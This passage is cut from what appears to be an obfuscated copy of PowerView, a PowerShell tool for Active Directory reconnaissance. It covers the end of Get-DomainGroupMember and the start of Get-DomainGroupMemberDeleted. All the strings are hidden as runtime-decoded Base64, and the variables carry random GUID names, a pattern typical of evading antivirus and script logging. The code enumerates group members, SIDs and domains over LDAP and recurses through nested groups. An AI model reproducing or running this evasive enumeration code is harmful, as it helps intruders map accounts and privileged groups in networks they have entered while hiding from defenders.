($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                   
 ${d91bb412dcea4151b58ec2d75755a9e5} = 
${b5a50316dca4465cad6cfeb0e116447c}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
           
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
                        
${69b7fdfe755c4a0cb633eb4f7125acda} = $Domain
                    }
   
                 else {
                        if 
(${d91bb412dcea4151b58ec2d75755a9e5}) {
                            
${69b7fdfe755c4a0cb633eb4f7125acda} = 
${d91bb412dcea4151b58ec2d75755a9e5}.SubString
(${d91bb412dcea4151b58ec2d75755a9e5}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 }
                    }
                    Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQ
BzAGkAbgBnACAATABEAEEAUAAgAG0AYQB0AGMAaABpAG4AZwAgAHIAdQBsAGUAIAB0AG
8AIAByAGUAYwB1AHIAcwBlACAAbwBuACAAJwAkAHsAZAA5ADEAYgBiADQAMQAyAGQAYw
BlAGEANAAxADUAMQBiADUAOABlAGMAMgBkADcANQA3ADUANQBhADkAZQA1AH0AJwAsAC
AAbwBuAGwAeQAgAHUAcwBlAHIAIABhAGMAYwBvAHUAbgB0AHMAIAB3AGkAbABsACAAYg
BlACAAcgBlAHQAdQByAG4AZQBkAC4A')))
                    
${342e0841e72a4d5b89eb7b6029624511}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMw
A2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1AD
UANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7AGQAOQAxAGIAYgA0ADEAMgBkAGMAZQ
BhADQAMQA1ADEAYgA1ADgAZQBjADIAZAA3ADUANwA1ADUAYQA5AGUANQB9ACkAKQA=')
))
                    
${342e0841e72a4d5b89eb7b6029624511}.PropertiesToLoad.AddRange
(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
             
       $Members = ${342e0841e72a4d5b89eb7b6029624511}.FindAll() | 
ForEach-Object {$_.Properties.distinguishedname[0]}
                
}
                $Null = ${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA'))))
            }
            else {
                
${987d1cda8c15450d8512978866836ba0} = ''
                $Filter = 
''
                $Identity | Where-Object {$_} | ForEach-Object {
   
                 ${0c2b6ec1d84e4c9188d4d73c607426d3} = $_.Replace
('(', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADgA')))).Replace(')', 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADkA'))))
                    if 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAA==')))) {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAwAGMAMgBiADYAZQBjADEAZAA4ADQAZQ
A0AGMAOQAxADgAOABkADQAZAA3ADMAYwA2ADAANwA0ADIANgBkADMAfQApAA==')))
   
                 }
                    elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBDAE4APQA=')))) {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMABjADIAYg
A2AGUAYwAxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyAD
YAZAAzAH0AKQA=')))
                        if ((-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
  
                          ${84423cbf5a544fd6aa05dc7201f84256} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.SubString
(${0c2b6ec1d84e4c9188d4d73c607426d3}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                     Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
B4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADgANAA0ADIAMwBjAG
IAZgA1AGEANQA0ADQAZgBkADYAYQBhADAANQBkAGMANwAyADAAMQBmADgANAAyADUANg
B9ACcAIABmAHIAbwBtACAAJwAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjAD
kAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AJwA=')))
           
                 ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${84423cbf5a544fd6aa05dc7201f84256}
        
                    ${342e0841e72a4d5b89eb7b6029624511} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
       if (-not ${342e0841e72a4d5b89eb7b6029624511}) {
               
                 Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQ
BuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAH
MAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAOAA0ADQAMgAzAGMAYgBmADUAYQ
A1ADQANABmAGQANgBhAGEAMAA1AGQAYwA3ADIAMAAxAGYAOAA0ADIANQA2AH0AJwA=')
))
                            }
                        }
             
       }
                    elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3} -imatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQ
AtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
            
            ${3e0cccb945b440b99b2100f08845f4a8} = 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                 
       ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                 }
                    elseif 
(${0c2b6ec1d84e4c9188d4d73c607426d3}.Contains('\')) {
                
        ${1a83f5c24b5141dcbf4cb4cd70c98c69} = 
${0c2b6ec1d84e4c9188d4d73c607426d3}.Replace
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -
OutputType Canonical
                        if 
(${1a83f5c24b5141dcbf4cb4cd70c98c69}) {
                            
${e7b22e8963a14a049819cb0cd46c57ce} = 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.SubString(0, 
${1a83f5c24b5141dcbf4cb4cd70c98c69}.IndexOf('/'))
                    
        $GroupName = ${0c2b6ec1d84e4c9188d4d73c607426d3}.Split('\')
[1]
                            ${987d1cda8c15450d8512978866836ba0} 
+= $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAEcAcgBvAHUAcABOAGEAbQ
BlACkA')))
                            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = ${e7b22e8963a14a049819cb0cd46c57ce}
        
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
B4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AGUANwBiADIAMgBlAD
gAOQA2ADMAYQAxADQAYQAwADQAOQA4ADEAOQBjAGIAMABjAGQANAA2AGMANQA3AGMAZQ
B9ACcAIABmAHIAbwBtACAAJwAkAHsAMABjADIAYgA2AGUAYwAxAGQAOAA0AGUANABjAD
kAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AJwA=')))
           
                 ${342e0841e72a4d5b89eb7b6029624511} = Get-
DomainSearcher @ea43c787582f45539b7f519da4680c7a
                     
   }
                    }
                    else {
                  
      ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYw
AxAGQAOAA0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH
0AKQA=')))
                    }
                }
                if 
(${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
      $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
                }
          
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQ
BzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AG
UAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    
$Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
              
  ${342e0841e72a4d5b89eb7b6029624511}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJA
BGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-
DomainGroupMember] Get-DomainGroupMember filter string: 
$(${342e0841e72a4d5b89eb7b6029624511}.filter)"
                try {
  
                  ${cb7c2f5226ed472aad598a82813f1629} = 
${342e0841e72a4d5b89eb7b6029624511}.FindOne()
                }
       
         catch {
                    Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
ByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAH
cAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAOg
AgACQAXwA=')))
                    $Members = @()
                }
    
            ${00499a3772104a55a5e44fc15c3e9436} = ''
                
${d91bb412dcea4151b58ec2d75755a9e5} = ''
                if 
(${cb7c2f5226ed472aad598a82813f1629}) {
                    $Members 
= ${cb7c2f5226ed472aad598a82813f1629}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIA'))))
                    if ($Members.count -eq 0) 
{
                        ${c36f676db0224d21a2fd7b80620adf3e} = 
$False
                        ${edd64880ad6b4371b3d2bc2906a517ae} = 
0
                        ${40113c65c94b477d8e2379848c444d00} = 0
     
                   while (-not ${c36f676db0224d21a2fd7b80620adf3e}) 
{
                            ${40113c65c94b477d8e2379848c444d00} = 
${edd64880ad6b4371b3d2bc2906a517ae} + 1499
                           
 ${83987833fe614c45bf5a7eb0e8267461}=
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsAZQBkAGQANgA0ADgAOAAwAGEAZA
A2AGIANAAzADcAMQBiADMAZAAyAGIAYwAyADkAMAA2AGEANQAxADcAYQBlAH0ALQAkAH
sANAAwADEAMQAzAGMANgA1AGMAOQA0AGIANAA3ADcAZAA4AGUAMgAzADcAOQA4ADQAOA
BjADQANAA0AGQAMAAwAH0A')))
                            
${edd64880ad6b4371b3d2bc2906a517ae} += 1500
                          
  $Null = 
${342e0841e72a4d5b89eb7b6029624511}.PropertiesToLoad.Clear()
         
                   $Null = 
${342e0841e72a4d5b89eb7b6029624511}.PropertiesToLoad.Add
($ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADgAMwA5ADgANwA4ADMAMwBmAGUANgAxADQAYwA0ADUAYgBmADUAYQA3AGUAYg
AwAGUAOAAyADYANwA0ADYAMQB9AA=='))))
                            $Null 
= ${342e0841e72a4d5b89eb7b6029624511}.PropertiesToLoad.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                      
      $Null = 
${342e0841e72a4d5b89eb7b6029624511}.PropertiesToLoad.Add
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
              
              try {
                                
${cb7c2f5226ed472aad598a82813f1629} = 
${342e0841e72a4d5b89eb7b6029624511}.FindOne()
                        
        ${ee13075028f949a2b027fce18defcc47} = 
${cb7c2f5226ed472aad598a82813f1629}.Properties.PropertyNames -like 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                       
         $Members += 
${cb7c2f5226ed472aad598a82813f1629}.Properties.item
(${ee13075028f949a2b027fce18defcc47})
                                
${00499a3772104a55a5e44fc15c3e9436} = 
${cb7c2f5226ed472aad598a82813f1629}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                   
             ${d91bb412dcea4151b58ec2d75755a9e5} = 
${cb7c2f5226ed472aad598a82813f1629}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
           
                     if ($Members.count -eq 0) {
                     
               ${c36f676db0224d21a2fd7b80620adf3e} = $True
           
                     }
                            }
                  
          catch 
[System.Management.Automation.MethodInvocationException] {
           
                     ${c36f676db0224d21a2fd7b80620adf3e} = $True
     
                       }
                        }
                    
}
                    else {
                        
${00499a3772104a55a5e44fc15c3e9436} = 
${cb7c2f5226ed472aad598a82813f1629}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                   
     ${d91bb412dcea4151b58ec2d75755a9e5} = 
${cb7c2f5226ed472aad598a82813f1629}.properties.item
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
           
             $Members += 
${cb7c2f5226ed472aad598a82813f1629}.Properties.item
(${ee13075028f949a2b027fce18defcc47})
                    }
           
         if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) {
                        
${69b7fdfe755c4a0cb633eb4f7125acda} = $Domain
                    }
   
                 else {
                        if 
(${d91bb412dcea4151b58ec2d75755a9e5}) {
                            
${69b7fdfe755c4a0cb633eb4f7125acda} = 
${d91bb412dcea4151b58ec2d75755a9e5}.SubString
(${d91bb412dcea4151b58ec2d75755a9e5}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 }
                    }
                }
            
}
            ForEach (${1b7dd34bbb37407f828b2f620f59a5e8} in 
$Members) {
                if ($Recurse -and $UseMatchingRule) {
     
               $Properties = $_.Properties
                }
          
      else {
                    ${caa6d77f782f4b31a5c47dcf7e394b17} 
= ${ea43c787582f45539b7f519da4680c7a}.Clone()
                    
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${1b7dd34bbb37407f828b2f620f59a5e8}
                    
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))] = $True
                    
${caa6d77f782f4b31a5c47dcf7e394b17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQ
BjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAG
MAdABjAGwAYQBzAHMA')))
                    $Object = Get-DomainObject 
@caa6d77f782f4b31a5c47dcf7e394b17
                    $Properties = 
$Object.Properties
                }
                if ($Properties) 
{
                    ${d6e0d7c9ef344a988a953fc95cac79e2} = New-
Object PSObject
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) 
${69b7fdfe755c4a0cb633eb4f7125acda}
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) ${00499a3772104a55a5e44fc15c3e9436}
   
                 ${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) 
${d91bb412dcea4151b58ec2d75755a9e5}
                    if 
($Properties.objectsid) {
                        
${d9d94567d1d64890b48d411c7fe1749a} = ((New-Object 
System.Security.Principal.SecurityIdentifier $Properties.objectsid
[0], 0).Value)
                    }
                    else {
        
                ${d9d94567d1d64890b48d411c7fe1749a} = $Null
          
          }
                    try {
                        
${8744e3532ea54cec8012ae4bce635438} = $Properties.distinguishedname
[0]
                        if (${8744e3532ea54cec8012ae4bce635438} 
-match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RgBvAHIAZQBpAGcAbgBTAGUAYwB1AHIAaQB0AHkAUAByAGkAbgBjAGkAcABhAGwAcw
B8AFMALQAxAC0ANQAtADIAMQA=')))) {
                            try {
   
                             if (-not 
${d9d94567d1d64890b48d411c7fe1749a}) {
                               
     ${d9d94567d1d64890b48d411c7fe1749a} = $Properties.cn[0]
         
                       }
                                
${acdf47197f6b49ddb3f8f3d174e65f09} = Convert-ADName -Identity 
${d9d94567d1d64890b48d411c7fe1749a} -OutputType 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA'))) 
@e95ff9a0cfb548dba5f1385fe67fc468
                                if 
(${acdf47197f6b49ddb3f8f3d174e65f09}) {
                              
      ${d8dc598e6a21422586826d41cd0f09cd} = 
${acdf47197f6b49ddb3f8f3d174e65f09}.Split('@')[1]
                    
            }
                                else {
                  
                  Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
ByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewA4ADcANAA0AGUAMwA1AD
MAMgBlAGEANQA0AGMAZQBjADgAMAAxADIAYQBlADQAYgBjAGUANgAzADUANAAzADgAfQ
A=')))
                                    
${d8dc598e6a21422586826d41cd0f09cd} = $Null
                          
      }
                            }
                            
catch {
                                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQ
ByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgACQAewA4ADcANAA0AGUAMwA1AD
MAMgBlAGEANQA0AGMAZQBjADgAMAAxADIAYQBlADQAYgBjAGUANgAzADUANAAzADgAfQ
A=')))
                                
${d8dc598e6a21422586826d41cd0f09cd} = $Null
                          
  }
                        }
                        else {
           
                 ${d8dc598e6a21422586826d41cd0f09cd} = 
${8744e3532ea54cec8012ae4bce635438}.SubString
(${8744e3532ea54cec8012ae4bce635438}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                 }
                    }
                    catch {
   
                     ${8744e3532ea54cec8012ae4bce635438} = $Null
     
                   ${d8dc598e6a21422586826d41cd0f09cd} = $Null
       
             }
                    if ($Properties.samaccountname) {
  
                      ${a89f2fde7acc4a6ca1ef8d25d1e1cb6f} = 
$Properties.samaccountname[0]
                    }
                   
 else {
                        try {
                            
${a89f2fde7acc4a6ca1ef8d25d1e1cb6f} = ConvertFrom-SID -ObjectSID 
$Properties.cn[0] @e95ff9a0cfb548dba5f1385fe67fc468
                  
      }
                        catch {
                            
${a89f2fde7acc4a6ca1ef8d25d1e1cb6f} = $Properties.cn[0]
              
          }
                    }
                    if 
($Properties.objectclass -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAG0AcAB1AHQAZQByAA==')))) {
                        
${0f07ba701e204c74896b08f208082a7b} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAG0AcAB1AHQAZQByAA==')))
                    }
                  
  elseif ($Properties.objectclass -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAA==')))) {
                        
${0f07ba701e204c74896b08f208082a7b} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAA==')))
                    }
                    
elseif ($Properties.objectclass -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgA=')))) {
                        
${0f07ba701e204c74896b08f208082a7b} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgA=')))
                    }
                    else {
    
                    ${0f07ba701e204c74896b08f208082a7b} = $Null
      
              }
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) 
${d8dc598e6a21422586826d41cd0f09cd}
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) 
${a89f2fde7acc4a6ca1ef8d25d1e1cb6f}
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')
)) ${8744e3532ea54cec8012ae4bce635438}
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIATwBiAGoAZQBjAHQAQwBsAGEAcwBzAA=='))) 
${0f07ba701e204c74896b08f208082a7b}
                    
${d6e0d7c9ef344a988a953fc95cac79e2} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBlAG0AYgBlAHIAUwBJAEQA'))) ${d9d94567d1d64890b48d411c7fe1749a}
   
                 
${d6e0d7c9ef344a988a953fc95cac79e2}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAATQBlAG0AYgBlAHIA'))))
      
              ${d6e0d7c9ef344a988a953fc95cac79e2}
                    
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQA=')))] -and 
${8744e3532ea54cec8012ae4bce635438} -and 
(${0f07ba701e204c74896b08f208082a7b} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAA=='))))) {
                        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAATQ
BhAG4AdQBhAGwAbAB5ACAAcgBlAGMAdQByAHMAaQBuAGcAIABvAG4AIABnAHIAbwB1AH
AAOgAgACQAewA4ADcANAA0AGUAMwA1ADMAMgBlAGEANQA0AGMAZQBjADgAMAAxADIAYQ
BlADQAYgBjAGUANgAzADUANAAzADgAfQA=')))
                        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = 
${8744e3532ea54cec8012ae4bce635438}
                        $Null = 
${ea43c787582f45539b7f519da4680c7a}.Remove
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AcABlAHIAdABpAGUAcwA='))))
                        Get-
DomainGroupMember @ea43c787582f45539b7f519da4680c7a
                  
  }
                }
            }
            
${342e0841e72a4d5b89eb7b6029624511}.dispose()
        }
    }
}
function 
Get-DomainGroupMemberDeleted {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType
('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name', 
'MemberDistinguishedName', 'MemberName')]
        [String[]]
        
$Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        
$Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
  
      [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
    
    [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
    
    [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
